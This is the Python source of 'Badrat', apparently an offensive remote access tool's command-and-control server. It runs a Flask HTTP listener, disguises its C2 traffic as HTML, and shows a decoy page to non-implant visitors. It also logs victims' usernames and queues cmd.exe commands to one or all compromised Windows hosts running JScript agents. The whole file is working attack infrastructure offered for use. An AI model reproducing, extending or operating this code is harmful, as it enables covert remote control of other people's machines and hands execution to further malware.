#!/usr/bin/env python3
from flask import Flask, request
import time
import json
import base64
import threading
import sys
import logging
import os

# CSCI 201 teacher: Noooo you can't just use global variables to make things easier
# haha, global variables go brrr
RED = '\033[91m'
ENDC = '\033[0m'
UNDERLINE = '\033[4m'

port=8080
# I should probably make a dict of dicts...
commands = {}
rats = {}
types = {}
usernames = {}

# Wrap C2 comms in html and html2 code to make requests look more legitimate
def htmlify(data):
    html = "<html><head><title>http server</title></head>\n"
    html += "<body>\n"
    html += "<b>\n"
    html2 = "</b>\n"
    html2 = "</body></html>\n"
    return(html + data + "\n" + html2)

# Page sent to "unauthorized" users of the http listener
def default_page():
    message = "WTF who are you go away"
    return(htmlify(message))

# Print colors according to the rat type
def colors(value):
    BOLD = '\033[1m'
    c = '\033[91m'  # Red
    py = '\033[92m'   # Green
    js = '\033[93m'   # Yellow
    ps1 = '\033[94m'  # Blue
    hta = '\033[95m'  # Purple
    colors = {"c":c, "py":py, "js":js, "ps1":ps1, "hta":hta}
    if(value in colors.keys()):
        return(colors[value] + value + ENDC)
    elif(value in types.keys()):
        return(colors[types[value]] + value + ENDC)
    elif(value == "all"):
        return(BOLD + "ALL RATS" + ENDC)
    elif(value == ">>"):
        return( BOLD + c + ">" + js + ">" + ENDC)
    elif(value == "commit Seppuku"):
        return(c + value + ENDC)
    else:
        return(UNDERLINE + value + ENDC)

def serve_server(port=8080):
    app = Flask(__name__)

    #Disable annoying console output for GET/POST requests
    log = logging.getLogger('werkzeug')
    log.disabled = True

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['GET'])
    def gtfo(path):
        # The rat code uses the POST method ONLY! A GET request is not from a rat
        print("[!] GET request from non-rat client requested path /" + path)
        return(default_page())

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['POST'])
    def badrat_comms(path):
        # Parse POST parameters
        post_json = request.get_json(force=True)
        post_dict = dict(post_json)
        try:
            ratID = str(post_dict['id'])
            ratType = str(post_dict['type'])
            username = str(post_dict['un'])
        except:
            print("[!] Failed to grab id, type, or user param from post request")
            return(default_page())

        # Update checkin time for an agent every checkin
        checkin = time.strftime("%H:%M:%S", time.localtime())
        rats[ratID] = checkin
        types[ratID] = ratType
        usernames[ratID] = username

        # If there is no current command for a rat, create a blank one
        if not ratID in commands:
            commands[ratID] = ""

        if("retval" in post_dict.keys()):
            print("\nResults from rat " + colors(str(post_dict['id'])) + "\n")
            print(base64.b64decode(post_dict['retval']).decode('utf-8'))

        return(htmlify(json.dumps({"cmnd": commands[ratID]})))

    app.run(host="0.0.0.0", port=port)

def get_rats(current=""):
    print("\n    agent id\ttype\tcheck-in\tusername")
    print("    --------\t----\t--------\t--------")
    for ratID, checkin in rats.items():
        if(current == ratID or current == "all"):
            print(" "+colors(">>")+" "+ratID+"   \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
        else:
            print("    "+ratID+"   \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
    print("")

def remove_rat(ratID):
    if(ratID == "all"):
        print("[*] Removing ALL rats")
        rats.clear()
        types.clear()
    else:
        try:
            del rats[ratID]
            del types[ratID]
            print("[*] Removing rat " + ratID)
        except:
            print("[!] Can't delete rat " + ratID + " for some reason")

def get_help():
    print("\nBadrat is a remote access tool with the goal of being as janky as possible ")
    print("It is intended to be used as a stage 0 rat, mostly to pass execution to other C2 frameworks")
    print("-------------------------------------------------------------------------")
    print("")
    print("Server commands: -- commands to control the badrat server")
    print("help -- it's this help page, duh")
    print("rats/agents/sessions -- gets the list of rats and their last checkin time")
    print("exit -- exits the badrat console and shuts down the listener")
    print("<ratID> -- start interacting with the specified rat")
    print("all -- start interacting with ALL rats")
    print("back -- backgrounds the current rat and goes to the main menu")
    print("remove all -- unregisters ALL rats")
    print("remove <ratID> -- unregisters the specified <ratID>")
    print("clear -- clear the screen. ")
    print("")
    print("Rat commands: -- commands to interact with a badrat rat")
    print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
    print("spawn -- used to spawn a new rat in a new wscript process.")
    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe")
    print("-------------------------------------------------------------------------")
    print("")
    print("Extra things to know:")
    print("The agent/rat is written in Windows JScript and executed with wscript.exe")
    print("The server is written in python and uses an HTTP listener for C2 comms")
    print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
    print("Command output is written to files in the %TEMP% directory, fetched, then the file is deleted")
    print("Spawned rats write their rat code to %TEMP% and currently don't clean themselves up because Windows can't delete files while in use")
    print("Use absolute paths. Badrat_server does not keep track of current directory")
    print("Rat communications are NOT SECURE. Do not send sensitive info through the C2 channel\n")

if __name__ == "__main__":
    # Start the Flask server
    print("[*] Starting HTTP listener on port " + str(port) + "\n\n")
    server = threading.Thread(target=serve_server, kwargs=dict(port=port), daemon=True)
    server.start()
    time.sleep(0.5)
    if not server.is_alive():
        print("[!] Could not start listener!")
        sys.exit()

# Main menu
while True:
    inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")

    # Check if the operator wants to quit badrat
    if(inp == "exit"):
        sys.exit()

    # Gets the help info
    elif(inp == "help"):
        get_help()

    # View rats, their types, and their latest checkin times
    elif(inp == "agents" or inp == "rats" or inp == "sessions"):
        get_rats()

    # Remove rats -- either by ratID or all
    elif(str.startswith(inp, "remove")):
        if(str.startswith(inp, "all", 6, 3)):
            remove_rat("all")
        else:
            remove_rat(inp.split(" ")[1])

    # Clear the screen
    elif(inp == "clear"):
        os.system("clear")

    # Enter rat specific command prompt
    elif(inp in rats.keys() or inp == "all"):
        ratID = inp
        while True:
            inp = input(colors(ratID) + " \\\\> ")
            if(inp == "back" or inp == "exit"):
                break
            elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
                get_rats(ratID)
            elif(inp == "clear"):
                os.system("clear")
            elif(inp.startswith("cd ")):
              print("[!] Full paths only! No cd in badrat")
            elif(inp):
                if(inp == "quit" or inp == "kill_rat"):
                    print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
                    inp = "quit"
                else:
                    print("[*] Queued command " + colors(inp) + " for " + colors(ratID))

                if(ratID == "all"):
                    # update ALL commands
                    for i in commands.keys():
                        commands[i] = inp
                else:
                    commands[ratID] = inp
